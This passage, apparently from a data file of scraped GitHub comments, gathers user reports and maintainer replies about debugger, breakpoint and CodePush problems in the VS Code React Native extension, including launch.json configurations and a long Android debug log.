GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-366982596,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AChNTX87jx_l5zEcvjoDV8L1jra2Geoyks5tWs1KgaJpZM4R5GjR\n.\n. Now I managed to replicate it even in VSCode Version 1.19.3\n\nso maybe something about the .vscode files crashed, or some running daemon?\nOn Mon, Feb 26, 2018 at 1:56 PM, Natwar Singh notifications@github.com\nwrote:\n\nYes resetting a single breakpoint allow me to use all the defined\nbreakpoint.\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.23.0\n\nnetss-MBP:~ nets$ node -v\nv9.5.0\n\nRN Tools : 0.6.3\nreact-native-cli: 2.0.1\nRN: 0.53.3\nVS Code: 1.20.1\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-368492851,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AChNTThzDguYIF8TmrCAVPBp6cpTWFBjks5tYqnmgaJpZM4R5GjR\n.\n. https://mega.nz/#!bQdCXSRQ!aKz9alToOoL4v1z4cJ9Gj3j0_-KGxuhtO1dt15CE9qs\nthese are my .vscode and .vscode-react-native folders\n. I did replicate the bug on two different macs, dunno how I managed that. I had eslint installed on both machines..... I tried the fix of deleting the react native tools (including the .vscode folders in home) and didn't help. As a matter of fact I just selected an action \"stop packager\" in VS Code and it works again! probably solved, even though it doesn't make sense, since when I started debugging, the process launched the packager.. \n",
    "hufans": "First use Xcode to build successfully before using vscode debugging. ",
    "sargant": "Additional information:\nexp --version\n46.0.3\npackage.json\n{\n  \"main\": \"node_modules/expo/AppEntry.js\",\n  \"private\": true,\n  \"dependencies\": {\n    \"expo\": \"^23.0.0\",\n    \"react\": \"16.0.0\",\n    \"react-native\": \"https://github.com/expo/react-native/archive/sdk-23.0.0.tar.gz\"\n  }\n}\n. From @weinand on November 19, 2017 20:54\nHow does the launch config look like?. launch.json\n```\n{\n  // Use IntelliSense to learn about possible attributes.\n  // Hover to view descriptions of existing attributes.\n  // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n  \"version\": \"0.2.0\",\n  \"configurations\": [\n{\n  \"name\": \"Debug Android\",\n  \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"launch\",\n  \"platform\": \"android\",\n  \"sourceMaps\": true,\n  \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n},\n{\n  \"name\": \"Debug iOS\",\n  \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"launch\",\n  \"platform\": \"ios\",\n  \"sourceMaps\": true,\n  \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n},\n{\n  \"name\": \"Attach to packager\",\n  \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"attach\",\n  \"sourceMaps\": true,\n  \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n},\n{\n  \"name\": \"Debug in Exponent\",\n  \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"launch\",\n  \"platform\": \"exponent\",\n  \"sourceMaps\": true,\n  \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n}\n\n]\n}\n```. From @weinand on November 19, 2017 20:59\nAha, you are using the reactnative debugger. Please move this issue to the reactnative repository. You can use this tool: https://github-issue-mover.appspot.com . ",
    "michaelduminy": "@iTOYS I'm still getting this error in 0.5.6\n. Works! Thanks. ",
    "Fernando-Marquardt": "@iTOYS I am still getting the same error after updating to 0.5.6.. Hey! 0.5.7 worked for me. Thank you!. ",
    "jc4p": "@iTOYS Also getting this same error after upgrading to 0.5.6, when trying to run on an iOS device.. ",
    "YogeshLegendkiller": "am getting this error in 0.6.5\n. ",
    "max-mironov": "@YogeshLegendkiller could you please provide as more info i.e. how to reproduce it step by step, your env, rn versions, NodeJS version, OS etc?. Discussed /w team, decided to move thisto separate brunch code-push-integration.. @jdeanwaite we have added tmp fix for this case, could you please upgrade VSCode RN extension for 0.6.5, reload VSCode and try again? \n(sourcemaps should be generated now, the only thing could be an issue described above: https://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-368421380, you could overcome it currently by removing/adding breakpoint again).. Should be fixed in https://github.com/Microsoft/vscode-react-native/pull/636. Closed as fix has been published!. Hey @G3z thanks so much for your feedback and your question!\nI've just tried to create a new RN app, add CodePush to it and release an update with VSCode extension, seems looking good so far.\nPlease see my app here: https://github.com/max-mironov/RNCPIssue637\nIf possible could you please share your app with us so we could look at (or at least how you integrate could push, code samples, react-native/code-push versions etc)?\nAlso I'll try to repro your issue with older versions of RN just in case.\nLooking forward for your reply!\nUPDATE: tried with old RN0.48, still working fine.. @LasseSLambertsen,  thanks, Released 0.6.6 :). Should be fixed in latest 0.6.4 version. . Thanks for your work @ruslan-bikkinin will you take care of cordova extension then? (I believe we could have the same issue there?). Hey guys, seems that latest version of metro bundler doesn't generate \n//# sourceMappingURL=http://localhost:8081/index.map?platform=ios&dev=true&minify=false \nfor bundle. \nI have posted a question here with some details: https://github.com/facebook/metro/issues/147\nIn the meantime will look at how we can overcome this.. UPDATE: \nThis should be fixed in new version of Metro Bundler (0.29.0) and hopefully be released soon.\nSo please keep calm and be patient!. @pennyandsean thanks for heads up, I've looked at and RN0.54.2 is going with metro 0.28.0. Hope next version of metro will be included in new RN release.. Hey guys, closing this issue for now as we have added tmp fix for this case in https://github.com/Microsoft/vscode-react-native/releases/tag/0.6.5. \nPlease reach us if you have any questions or see any problems.. @victorias, @code-matt just have tried it with VSCode 1.21 (I'm on mac) and don't see any issues with it. \nWhat I could suggest to try if the issue is still active for you:\n1) update vscode to latest version if it is not already\n2) remove vscode rn extension and close/open vscode\n3) remove launch.json (backup it if needed)\n4) install vscode rn extension again and close/open vscode\n5) check to see if it works for you and let us know the results . Thanks for reply @code-matt! Glad to see that the issue was resolved for you.\n@victorias could you please try one of this options and let us know if it helped?\n. Hello @isurugajasinghe, AFAIK they should work, there is one known issue with them, please see link with details and also with info how you could overcome it: https://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-368421380\nIf you see any other issues - please provide us with more context about your problem, thanks! . Thanks for getting back, closing the current one.. Close this PR as currently we suppose that CodePush functionality will be moved to another vscode plugin, anyway thanks Ruslan for taking care! . Hi there guys, thanks for pointing out, fixed in latest version, my sincerest apologies for any inconvenience this may have caused. . I'd rather not to change the logic of gulp check-imports function at all as there is nothing wrong with it.\nThe only thing we should do is to exclude app-center-node-client folder.\nIf we should not check imports here we should better exclude this files from tsconfig at all. (also I believe these are js files so shouldn't be built in the end?). ",
    "jboulay": "I have this problem to since the installation of react-native-tcp and rn-nodeify. \nIt seems these packages change global.process \n. ",
    "RaphyLi": "Hi @iTOYS I have the same problem like @jboulay and @MikkelSnitker \nI have the same scenario as @jboulay . ",
    "CasDigital": "Hi there, I am also getting the same issue. I have also installed react-native-tcp and rn-nodeify. I am not sure if it's got something to do with this. Just to give context; This occurs both when I run my project from the debug menu or when I manually run react-native run-android with a separate CLI. I am using a Mac, and I am debugging on a physical Android device. . ",
    "edgebal": "Hello, I've got the same issue. I'm using rn-nodeify. This occurs when I select the \"Debug iOS\" option on Code's debug launcher.\nRunning the project from command line (react-native run-ios) works OK.\nlaunch.json: https://gist.github.com/edgebal/5a0c6364366daedbcbcc38b61798fee7\nDebug output\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 34436\nTypeError: process.send is not a function\ndebuggerWorker.js:40\n    at postMessage ([PROJECT_WORKSPACE_ROOT]/.vscode/.react/debuggerWorker.js:40:13)\n    at sendReply ([PROJECT_WORKSPACE_ROOT]/.vscode/.react/debuggerWorker.js:113:7)\n    at executeApplicationScript ([PROJECT_WORKSPACE_ROOT]/.vscode/.react/debuggerWorker.js:98:7)\n    at [PROJECT_WORKSPACE_ROOT]/.vscode/.react/debuggerWorker.js:119:7\n    at process.<anonymous> ([PROJECT_WORKSPACE_ROOT]/.vscode/.react/debuggerWorker.js:35:9)\n    at emitTwo (events.js:126:13)\n    at process.emit (events.js:214:7)\n    at emit (internal/child_process.js:772:12)\n    at _combinedTickCallback (internal/process/next_tick.js:141:11)\n    at process._tickCallback (internal/process/next_tick.js:180:9)\nSoftware versions\nReact-Native VS Code extension version: 0.5.7\nVSCode version: 1.20.1\nOS platform and version: macOS High Sierra 10.13.2\nNodeJS version: 8.9.3\nReact Native version: 0.52.2 (react-native-cli: 2.0.1)\n. ",
    "olegdeezus": "I've receiving this error when nem-sdk module is imported. In other case all is ok. Nem-sdk not have rn-nodeify dependency and not calling process.send method.. Added PR to react-native-tcp (https://github.com/PeelTechnologies/react-native-tcp/pull/70) to fix this problem.. I have same error in both cases: when packager started from within vscode and when I connect to external packager. This behaviour was checked few times and I had same result. Later I try to give more details.. @sergey-akhalkov \n1. No\n2. Yes, issue was reproduced on your repo\n3. macos High Sierra\n4. Just cloned your repo, npm install, set breakpoints in App.js:27 and App.js:31 and faced this problem\n5. Default\n6. I think, I seen this issue before (september-october release maybe) but not sure.\n7. react-native-cli: 2.0.1\n8. \n- React-Native VS Code extension version: 0.6.0\n- VSCode version: 1.20.1\n- OS platform and version: macOS High Sierra 10.13.3\n- NodeJS version: 9.5.0\n- React Native version: 0.53.2 & 0.52.2 on my project\n9. Reinstalled (settings not been erased) but got some problem.\nDowngraded VSCode to 1.19.3 and breakpoints work! But when I switched back to 1.20.1 breakpoints  don't work again.. ",
    "stewhi": "Is there any movement on this? I see the PR is still open, has another fix come up?. ",
    "MrHubble": "Debug Console (View -> Toggle Debug Console)\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.18.5\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nOutput of the Debug Console (View -> Toggle Debug Console)\n````\n[Info] 11-28 08:21:04.545  8892  8892 D ReactNative: [CodePush] Loading JS bundle from \"assets://index.android.bundle\"\n[Info] 11-28 08:21:04.546  8892  8892 D ReactNative: ReactInstanceManager.ctor()\n[Info] 11-28 08:21:04.575  8892  8892 D ReactNative: ReactInstanceManager.createReactContextInBackground()\n[Info] 11-28 08:21:04.575  8892  8892 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 11-28 08:21:05.311  8892  8892 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n[Info] 11-28 08:21:05.327  8892  8892 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n[Info] 11-28 08:21:05.327  8892  8892 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n11-28 08:21:05.328  8892  9116 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 11-28 08:21:05.460  8892  9116 D ReactNative: Initializing React Xplat Bridge.\n[Info] 11-28 08:21:05.463  8892  9116 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 11-28 08:21:05.477  8892  9116 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n11-28 08:21:05.477  8892  9116 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 11-28 08:21:05.478  8892  8892 D ReactNative: ReactInstanceManager.setupReactContext()\n11-28 08:21:05.478  8892  8892 D ReactNative: CatalystInstanceImpl.initialize()\n[Info] 11-28 08:21:05.483  8892  8892 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 11-28 08:21:07.478  8892  9118 W ReactNativeJS: Warning: PropTypes has been moved to a separate package. Accessing React.PropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n[Info] 11-28 08:21:07.564  8892  9118 W ReactNativeJS: Warning: checkPropTypes has been moved to a separate package. Accessing React.checkPropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n11-28 08:21:07.564  8892  9118 W ReactNativeJS: Warning: React.createClass is no longer supported. Use a plain JavaScript class instead. If you're not yet ready to migrate, create-react-class is available on npm as a drop-in replacement. (https://fb.me/migrating-from-react-create-class)\n[Info] 11-28 08:21:07.635  8892  9118 I ReactNativeJS: Running application \"my_app\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n[Info] 11-28 08:21:07.836  8892  9118 I ReactNativeJS: [CodePush] Checking for update.\n[Info] 11-28 08:21:08.685  8892  9118 I ReactNativeJS: [CodePush] App is up to date.\n[Info] 11-28 08:26:32.553 10486 10486 D ReactNative: [CodePush] Loading JS bundle from \"assets://index.android.bundle\"\n[Info] 11-28 08:26:32.554 10486 10486 D ReactNative: ReactInstanceManager.ctor()\n[Info] 11-28 08:26:32.553 10486 10486 D ReactNative: [CodePush] Loading JS bundle from \"assets://index.android.bundle\"\n11-28 08:26:32.554 10486 10486 D ReactNative: ReactInstanceManager.ctor()\n[Info] 11-28 08:26:32.553 10486 10486 D ReactNative: [CodePush] Loading JS bundle from \"assets://index.android.bundle\"\n11-28 08:26:32.554 10486 10486 D ReactNative: ReactInstanceManager.ctor()\n[Info] 11-28 08:26:32.584 10486 10486 D ReactNative: ReactInstanceManager.createReactContextInBackground()\n11-28 08:26:32.584 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 11-28 08:26:32.584 10486 10486 D ReactNative: ReactInstanceManager.createReactContextInBackground()\n11-28 08:26:32.584 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 11-28 08:26:32.584 10486 10486 D ReactNative: ReactInstanceManager.createReactContextInBackground()\n11-28 08:26:32.584 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 11-28 08:26:33.067 10486 10486 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n[Info] 11-28 08:26:33.067 10486 10486 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n[Info] 11-28 08:26:33.067 10486 10486 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n[Info] 11-28 08:26:33.084 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n11-28 08:26:33.084 10486 10486 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n[Info] 11-28 08:26:33.084 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n11-28 08:26:33.084 10486 10486 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n[Info] 11-28 08:26:33.084 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n11-28 08:26:33.084 10486 10486 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n[Info] 11-28 08:26:33.085 10486 10640 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 11-28 08:26:33.085 10486 10640 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 11-28 08:26:33.085 10486 10640 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 11-28 08:26:33.223 10486 10640 D ReactNative: Initializing React Xplat Bridge.\n[Info] 11-28 08:26:33.223 10486 10640 D ReactNative: Initializing React Xplat Bridge.\n[Info] 11-28 08:26:33.223 10486 10640 D ReactNative: Initializing React Xplat Bridge.\n[Info] 11-28 08:26:33.227 10486 10640 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 11-28 08:26:33.227 10486 10640 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 11-28 08:26:33.227 10486 10640 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 11-28 08:26:33.256 10486 10640 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n11-28 08:26:33.256 10486 10640 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 11-28 08:26:33.256 10486 10640 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n[Info] 11-28 08:26:33.256 10486 10640 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n11-28 08:26:33.256 10486 10640 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 11-28 08:26:33.256 10486 10640 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 11-28 08:26:33.257 10486 10486 D ReactNative: ReactInstanceManager.setupReactContext()\n11-28 08:26:33.257 10486 10486 D ReactNative: CatalystInstanceImpl.initialize()\n11-28 08:26:33.259 10486 10486 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 11-28 08:26:33.257 10486 10486 D ReactNative: ReactInstanceManager.setupReactContext()\n11-28 08:26:33.257 10486 10486 D ReactNative: CatalystInstanceImpl.initialize()\n11-28 08:26:33.259 10486 10486 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 11-28 08:26:33.257 10486 10486 D ReactNative: ReactInstanceManager.setupReactContext()\n11-28 08:26:33.257 10486 10486 D ReactNative: CatalystInstanceImpl.initialize()\n11-28 08:26:33.259 10486 10486 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 11-28 08:26:36.160 10486 10642 W ReactNativeJS: Warning: PropTypes has been moved to a separate package. Accessing React.PropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n[Info] 11-28 08:26:36.160 10486 10642 W ReactNativeJS: Warning: PropTypes has been moved to a separate package. Accessing React.PropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n[Info] 11-28 08:26:36.160 10486 10642 W ReactNativeJS: Warning: PropTypes has been moved to a separate package. Accessing React.PropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n[Info] 11-28 08:26:36.247 10486 10642 W ReactNativeJS: Warning: checkPropTypes has been moved to a separate package. Accessing React.checkPropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n11-28 08:26:36.247 10486 10642 W ReactNativeJS: Warning: React.createClass is no longer supported. Use a plain JavaScript class instead. If you're not yet ready to migrate, create-react-class is available on npm as a drop-in replacement. (https://fb.me/migrating-from-react-create-class)\n[Info] 11-28 08:26:36.247 10486 10642 W ReactNativeJS: Warning: checkPropTypes has been moved to a separate package. Accessing React.checkPropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n11-28 08:26:36.247 10486 10642 W ReactNativeJS: Warning: React.createClass is no longer supported. Use a plain JavaScript class instead. If you're not yet ready to migrate, create-react-class is available on npm as a drop-in replacement. (https://fb.me/migrating-from-react-create-class)\n[Info] 11-28 08:26:36.247 10486 10642 W ReactNativeJS: Warning: checkPropTypes has been moved to a separate package. Accessing React.checkPropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n11-28 08:26:36.247 10486 10642 W ReactNativeJS: Warning: React.createClass is no longer supported. Use a plain JavaScript class instead. If you're not yet ready to migrate, create-react-class is available on npm as a drop-in replacement. (https://fb.me/migrating-from-react-create-class)\n[Info] 11-28 08:26:36.318 10486 10642 I ReactNativeJS: Running application \"my_app\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n[Info] 11-28 08:26:36.318 10486 10642 I ReactNativeJS: Running application \"my_app\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n[Info] 11-28 08:26:36.318 10486 10642 I ReactNativeJS: Running application \"my_app\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n[Info] 11-28 08:26:36.566 10486 10642 I ReactNativeJS: [CodePush] Checking for update.\n[Info] 11-28 08:26:36.566 10486 10642 I ReactNativeJS: [CodePush] Checking for update.\n[Info] 11-28 08:26:36.566 10486 10642 I ReactNativeJS: [CodePush] Checking for update.\n[Info] 11-28 08:26:36.571 10486 10642 I ReactNativeJS: [CodePush] Reporting binary update (1.0)\n[Info] 11-28 08:26:36.571 10486 10642 I ReactNativeJS: [CodePush] Reporting binary update (1.0)\n[Info] 11-28 08:26:36.571 10486 10642 I ReactNativeJS: [CodePush] Reporting binary update (1.0)\n[Info] 11-28 08:26:37.649 10486 10642 I ReactNativeJS: [CodePush] Downloading package.\n[Info] 11-28 08:26:37.649 10486 10642 I ReactNativeJS: [CodePush] Downloading package.\n[Info] 11-28 08:26:37.649 10486 10642 I ReactNativeJS: [CodePush] Downloading package.\n[Info] 11-28 08:26:39.469 10486 10625 D ReactNative: [CodePush] Applying full update.\n[Info] 11-28 08:26:39.469 10486 10625 D ReactNative: [CodePush] Applying full update.\n[Info] 11-28 08:26:39.469 10486 10625 D ReactNative: [CodePush] Applying full update.\n[Info] 11-28 08:26:39.478 10486 10642 I ReactNativeJS: [CodePush] Installing update.\n[Info] 11-28 08:26:39.478 10486 10642 I ReactNativeJS: [CodePush] Installing update.\n[Info] 11-28 08:26:39.478 10486 10642 I ReactNativeJS: [CodePush] Installing update.\n[Info] 11-28 08:26:39.516 10486 10643 D ReactNative: [CodePush] Loading JS bundle from \"/data/user/0/team.my-app/files/CodePush/171220f793de81b506e4d855fd94d755aa9aedf09cff0e9e5f1aa77e9bb8bd9e/CodePush/index.android.bundle\"\n[Info] 11-28 08:26:39.517 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 11-28 08:26:39.516 10486 10643 D ReactNative: [CodePush] Loading JS bundle from \"/data/user/0/team.my-app/files/CodePush/171220f793de81b506e4d855fd94d755aa9aedf09cff0e9e5f1aa77e9bb8bd9e/CodePush/index.android.bundle\"\n11-28 08:26:39.517 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 11-28 08:26:39.516 10486 10643 D ReactNative: [CodePush] Loading JS bundle from \"/data/user/0/team.my-app/files/CodePush/171220f793de81b506e4d855fd94d755aa9aedf09cff0e9e5f1aa77e9bb8bd9e/CodePush/index.android.bundle\"\n11-28 08:26:39.517 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 11-28 08:26:39.519 10486 10642 I ReactNativeJS: [CodePush] Restarting app\n[Info] 11-28 08:26:39.519 10486 10642 I ReactNativeJS: [CodePush] Restarting app\n[Info] 11-28 08:26:39.519 10486 10642 I ReactNativeJS: [CodePush] Restarting app\n[Info] 11-28 08:26:39.989 10486 10486 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n[Info] 11-28 08:26:39.989 10486 10486 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n[Info] 11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.tearDownReactContext()\n[Info] 11-28 08:26:39.989 10486 10486 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.tearDownReactContext()\n[Info] 11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n11-28 08:26:39.990 10486 10486 D ReactNative: ReactInstanceManager.tearDownReactContext()\n[Info] 11-28 08:26:39.996 10486 10486 D ReactNative: CatalystInstanceImpl.destroy() start\n[Info] 11-28 08:26:39.996 10486 10486 D ReactNative: CatalystInstanceImpl.destroy() start\n[Info] 11-28 08:26:39.996 10486 10486 D ReactNative: CatalystInstanceImpl.destroy() start\n[Info] 11-28 08:26:39.999 10486 10677 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 11-28 08:26:39.999 10486 10677 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 11-28 08:26:39.999 10486 10677 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 11-28 08:26:40.010 10486 10486 D ReactNative: CatalystInstanceImpl.destroy() end\n[Info] 11-28 08:26:40.010 10486 10486 D ReactNative: CatalystInstanceImpl.destroy() end\n[Info] 11-28 08:26:40.010 10486 10486 D ReactNative: CatalystInstanceImpl.destroy() end\n[Info] 11-28 08:26:40.093 10486 10677 D ReactNative: Initializing React Xplat Bridge.\n[Info] 11-28 08:26:40.093 10486 10677 D ReactNative: Initializing React Xplat Bridge.\n[Info] 11-28 08:26:40.093 10486 10677 D ReactNative: Initializing React Xplat Bridge.\n11-28 08:26:40.094 10486 10677 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 11-28 08:26:40.094 10486 10677 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 11-28 08:26:40.094 10486 10677 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 11-28 08:26:40.198 10486 10677 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n11-28 08:26:40.199 10486 10677 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 11-28 08:26:40.198 10486 10677 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n11-28 08:26:40.199 10486 10677 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 11-28 08:26:40.198 10486 10677 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n11-28 08:26:40.199 10486 10677 D ReactNative: CatalystInstanceImpl.runJSBundle()\n11-28 08:26:40.199 10486 10486 D ReactNative: ReactInstanceManager.setupReactContext()\n11-28 08:26:40.199 10486 10486 D ReactNative: CatalystInstanceImpl.initialize()\n11-28 08:26:40.200 10486 10486 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 11-28 08:26:40.199 10486 10486 D ReactNative: ReactInstanceManager.setupReactContext()\n11-28 08:26:40.199 10486 10486 D ReactNative: CatalystInstanceImpl.initialize()\n11-28 08:26:40.200 10486 10486 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 11-28 08:26:40.199 10486 10486 D ReactNative: ReactInstanceManager.setupReactContext()\n11-28 08:26:40.199 10486 10486 D ReactNative: CatalystInstanceImpl.initialize()\n11-28 08:26:40.200 10486 10486 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 11-28 08:26:42.122 10486 10678 W ReactNativeJS: Warning: PropTypes has been moved to a separate package. Accessing React.PropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n[Info] 11-28 08:26:42.122 10486 10678 W ReactNativeJS: Warning: PropTypes has been moved to a separate package. Accessing React.PropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n[Info] 11-28 08:26:42.122 10486 10678 W ReactNativeJS: Warning: PropTypes has been moved to a separate package. Accessing React.PropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n[Info] 11-28 08:26:42.204 10486 10678 W ReactNativeJS: Warning: checkPropTypes has been moved to a separate package. Accessing React.checkPropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n11-28 08:26:42.205 10486 10678 W ReactNativeJS: Warning: React.createClass is no longer supported. Use a plain JavaScript class instead. If you're not yet ready to migrate, create-react-class is available on npm as a drop-in replacement. (https://fb.me/migrating-from-react-create-class)\n[Info] 11-28 08:26:42.204 10486 10678 W ReactNativeJS: Warning: checkPropTypes has been moved to a separate package. Accessing React.checkPropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n11-28 08:26:42.205 10486 10678 W ReactNativeJS: Warning: React.createClass is no longer supported. Use a plain JavaScript class instead. If you're not yet ready to migrate, create-react-class is available on npm as a drop-in replacement. (https://fb.me/migrating-from-react-create-class)\n[Info] 11-28 08:26:42.204 10486 10678 W ReactNativeJS: Warning: checkPropTypes has been moved to a separate package. Accessing React.checkPropTypes is no longer supported and will be removed completely in React 16. Use the prop-types package on npm instead. (https://fb.me/migrating-from-react-proptypes)\n11-28 08:26:42.205 10486 10678 W ReactNativeJS: Warning: React.createClass is no longer supported. Use a plain JavaScript class instead. If you're not yet ready to migrate, create-react-class is available on npm as a drop-in replacement. (https://fb.me/migrating-from-react-create-class)\n[Info] 11-28 08:26:42.274 10486 10678 I ReactNativeJS: Running application \"my_app\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n[Info] 11-28 08:26:42.274 10486 10678 I ReactNativeJS: Running application \"my_app\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n[Info] 11-28 08:26:42.274 10486 10678 I ReactNativeJS: Running application \"my_app\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n[Info] 11-28 08:26:42.527 10486 10678 I ReactNativeJS: [CodePush] Checking for update.\n[Info] 11-28 08:26:42.527 10486 10678 I ReactNativeJS: [CodePush] Checking for update.\n[Info] 11-28 08:26:42.527 10486 10678 I ReactNativeJS: [CodePush] Checking for update.\n[Info] 11-28 08:26:42.533 10486 10678 I ReactNativeJS: [CodePush] Reporting CodePush update success (v1)\n[Info] 11-28 08:26:42.533 10486 10678 I ReactNativeJS: [CodePush] Reporting CodePush update success (v1)\n[Info] 11-28 08:26:42.533 10486 